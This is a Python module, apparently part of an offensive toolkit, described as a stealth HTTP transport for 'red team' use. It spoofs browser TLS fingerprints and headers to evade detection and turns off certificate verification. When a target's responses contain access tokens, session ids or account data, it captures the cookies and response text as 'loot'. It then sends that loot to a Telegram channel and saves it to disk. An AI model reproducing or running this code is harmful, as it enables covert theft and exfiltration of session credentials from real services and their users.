#!/usr/bin/env python3
"""
TRANSPORT.PY v8.8 — Centralized Stealth HTTP, Adversarial TLS & Behavioral Middleware (Elite Red Team Adversarial Edition)
Features:
- Zero-noise filtering: Restricts broadcasts strictly to verified high-value breach loot and critical exploit pivots.
- Advanced browser fingerprint impersonation (JA3/JA4 evasion via curl_cffi & spoofed SSL contexts).
- Poisson behavioral timing jitter and randomized browser client hints.
- Robust cookie-jar state synchronization & header rotation with SHA-256 integrity fingerprinting.
- SHA-256 tamper-evident immutable disk loot persistence (loot_output/) and forensic proof-of-work streaming.
"""
import http.client
import json
import ssl
import socket
import time
import asyncio
import random
import hashlib
from urllib.parse import urlsplit

# Import advanced adversarial TLS evasion, behavioral modules, immutable loot logger, and Telegram notifier
from modules.tls_evasion import create_spoofed_ssl_context, AdversarialTLSSession, CFFI_AVAILABLE
from modules.behavioral_mimic import apply_behavioral_jitter, get_randomized_hints
from modules.telegram_notifier import send_telegram_alert
from modules.loot_logger import save_session_loot
from modules.telemetry import stream_proof

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:123.0) Gecko/20100101 Firefox/123.0"
]

# Keywords required to pass the zero-noise filter
HIGH_VALUE_KEYWORDS = [
    "critical", "bypass", "success", "loot", "token", "session", 
    "admin", "credential", "compromised", "race", "pivot", "jwt", "dump"
]

async def broadcast_tg_alert_async(loot_type, details):
    try:
        check_str = f"{loot_type} {str(details)}".lower()
        if any(kw in check_str for kw in HIGH_VALUE_KEYWORDS):
            await send_telegram_alert(f"[CRITICAL BREACH] {loot_type}", details)
    except Exception:
        pass

def broadcast_tg_alert_sync(loot_type, details):
    """Helper to non-blockingly fire Telegram alerts from synchronous transport methods."""
    try:
        loop = asyncio.get_running_loop()
        if loop.is_running():
            loop.create_task(broadcast_tg_alert_async(loot_type, details))
        else:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
    except RuntimeError:
        try:
            asyncio.run(broadcast_tg_alert_async(loot_type, details))
        except Exception:
            pass

class SecureTransport:
    def __init__(self, target_url, browser_profile="chrome120"):
        parsed = urlsplit(target_url)
        self.target_url = target_url
        self.host = parsed.hostname
        self.secure = parsed.scheme == "https"
        self.port = parsed.port or (443 if self.secure else 80)
        self.base_path = parsed.path.rstrip("/")
        self.cookie_jar = {}
        
        self.adversarial_tls = AdversarialTLSSession(self.host, browser_profile=browser_profile)
        self.cffi_session = self.adversarial_tls.get_impersonated_session() if CFFI_AVAILABLE else None

    def update_cookies(self, set_cookie_header):
        if not set_cookie_header:
            return
        if isinstance(set_cookie_header, str):
            for cookie in set_cookie_header.split(","):
                part = cookie.split(";")[0].strip()
                if "=" in part:
                    k, v = part.split("=", 1)
                    if k.lower() not in ["path", "expires", "domain", "samesite", "secure", "httponly"]:
                        self.cookie_jar[k.strip()] = v.strip()
        elif isinstance(set_cookie_header, dict):
            self.cookie_jar.update(set_cookie_header)

    def get_cookie_header_value(self):
        if not self.cookie_jar:
            return ""
        if isinstance(self.cookie_jar, dict):
            return "; ".join([f"{k}={v}" for k, v in self.cookie_jar.items()])
        return str(self.cookie_jar)

    def request(self, method, path, payload=None, extra_headers=None, retries=3):
        apply_behavioral_jitter()

        endpoint = f"{self.base_path}{path}" if not path.startswith(self.base_path) else path
        full_url = f"{self.target_url.rstrip('/')}{path}" if not path.startswith("http") else path

        if self.cffi_session and self.secure:
            headers = {
                "User-Agent": random.choice(USER_AGENTS),
                "Accept": "text/html,application/json,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.5",
            }
            headers.update(get_randomized_hints())
            cookie_str = self.get_cookie_header_value()
            if cookie_str:
                headers["Cookie"] = cookie_str
            if extra_headers:
                headers.update(extra_headers)

            for attempt in range(retries):
                try:
                    if method.upper() == "GET":
                        res = self.cffi_session.get(full_url, headers=headers, timeout=10, verify=False)
                    elif method.upper() == "POST":
                        res = self.cffi_session.post(full_url, json=payload, headers=headers, timeout=10, verify=False)
                    elif method.upper() == "PUT":
                        res = self.cffi_session.put(full_url, json=payload, headers=headers, timeout=10, verify=False)
                    else:
                        res = self.cffi_session.request(method, full_url, json=payload, headers=headers, timeout=10, verify=False)

                    resp_headers = {k.lower(): v for k, v in res.headers.items()}
                    if "set-cookie" in resp_headers:
                        self.update_cookies(resp_headers["set-cookie"])

                    data = res.text
                    body_lower = data.lower()
                    if res.status_code in [200, 201, 302] and any(k in body_lower for k in ["access_token", "auth_token", "session_id", "admin", "balance"]):
                        loot_hash = hashlib.sha256(data.encode("utf-8", errors="ignore")).hexdigest()
                        transport_loot = {
                            "endpoint": full_url,
                            "status": res.status_code,
                            "integrity_hash": loot_hash,
                            "cookie_jar": self.get_cookie_header_value(),
                            "response_snippet": data[:300]
                        }
                        
                        broadcast_tg_alert_sync("Transport Layer Session Loot", transport_loot)
                        stream_proof("TRANSPORT_SESSION_CAPTURE", full_url, {"method": method, "hash": loot_hash}, data[:300], transport_loot)
                        save_session_loot(
                            target=self.target_url,
                            endpoint=path,
                            finding_type="TRANSPORT_SESSION_LOOT_SUCCESS",
                            status=res.status_code,
                            headers=resp_headers,
                            body=data,
                            extra_loot=transport_loot
                        )

                    return res.status_code, resp_headers, data

                except Exception:
                    if attempt < retries - 1:
                        time.sleep(0.4 * (attempt + 1))
                        continue

        headers = {
            "Host": self.host,
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/json,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "close"
        }
        headers.update(get_randomized_hints())

        cookie_str = self.get_cookie_header_value()
        if cookie_str:
            headers["Cookie"] = cookie_str

        if extra_headers:
            headers.update(extra_headers)

        body = None
        if payload:
            body = json.dumps(payload).encode("utf-8")
            headers["Content-Type"] = "application/json"

        for attempt in range(retries):
            conn = None
            try:
                if self.secure:
                    ctx = create_spoofed_ssl_context(self.host)
                    conn = http.client.HTTPSConnection(self.host, self.port, timeout=10, context=ctx)
                else:
                    conn = http.client.HTTPConnection(self.host, self.port, timeout=10)

                conn.request(method, endpoint, body=body, headers=headers)
                res = conn.getresponse()
                data = res.read(512 * 1024).decode("utf-8", errors="replace")
                resp_headers = {k.lower(): v for k, v in res.getheaders()}

                if "set-cookie" in resp_headers:
                    self.update_cookies(resp_headers["set-cookie"])

                body_lower = data.lower()
                if res.status in [200, 201, 302] and any(k in body_lower for k in ["access_token", "auth_token", "session_id", "admin", "balance"]):
                    loot_hash = hashlib.sha256(data.encode("utf-8", errors="ignore")).hexdigest()
                    transport_loot = {
                        "endpoint": f"https://{self.host}{endpoint}",
                        "status": res.status,
                        "integrity_hash": loot_hash,
                        "cookie_jar": self.get_cookie_header_value(),
                        "response_snippet": data[:300]
                    }
                    
                    broadcast_tg_alert_sync("Transport Layer Session Loot", transport_loot)
                    stream_proof("TRANSPORT_SESSION_CAPTURE", f"https://{self.host}{endpoint}", {"method": method, "hash": loot_hash}, data[:300], transport_loot)
                    save_session_loot(
                        target=self.target_url,
                        endpoint=path,
                        finding_type="TRANSPORT_SESSION_LOOT_SUCCESS",
                        status=res.status,
                        headers=resp_headers,
                        body=data,
                        extra_loot=transport_loot
                    )

                return res.status, resp_headers, data

            except (ssl.SSLError, socket.timeout, ConnectionError, OSError):
                if attempt < retries - 1:
                    time.sleep(0.4 * (attempt + 1))
                    continue
                return 0, {}, ""
            except Exception:
                return 0, {}, ""
            finally:
                if conn:
                    try:
                        conn.close()
                    except Exception:
                        pass
        return 0, {}, ""
